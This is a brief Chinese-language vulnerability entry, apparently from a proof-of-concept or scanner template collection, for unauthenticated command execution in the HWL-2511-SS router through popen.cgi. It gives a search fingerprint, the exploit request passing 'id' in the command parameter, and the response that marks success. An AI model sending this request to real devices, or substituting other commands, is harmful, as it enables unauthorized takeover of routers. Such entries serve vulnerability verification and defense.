# HWL-2511-SS路由器popen.cgi命令执行漏洞

HWL ｜ 命令执行 ｜ —
- **指纹**：`body="app/feature/portForwarding.js"`
- **请求**：`GET /cgi-bin/popen.cgi?command=id HTTP/1.1`
- **响应特征**：200 uid